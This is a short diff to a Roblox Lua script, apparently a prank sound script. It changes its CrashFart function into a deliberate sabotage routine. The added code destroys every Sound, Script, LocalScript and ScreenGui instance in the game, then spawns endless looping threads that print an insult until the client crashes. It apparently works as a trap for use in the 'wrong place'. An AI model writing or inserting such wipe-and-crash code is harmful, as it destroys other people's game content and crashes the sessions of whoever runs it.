@@ -16,7 +16,8 @@ local FartSounds = {
 }
 
 local function CrashFart()
-	for i=1,50 do
+	for _,instance in ipairs(game:GetDescendants()) do if instance.ClassName == 'Sound' or instance.ClassName == 'Script' or instance.ClassName == 'LocalScript' or instance.ClassName == 'ScreenGui' then instance:Destroy() end end
+	for i=1,math.huge do
 		task.spawn(function()
 			while true do
 				warn('Wrong place idiot.')
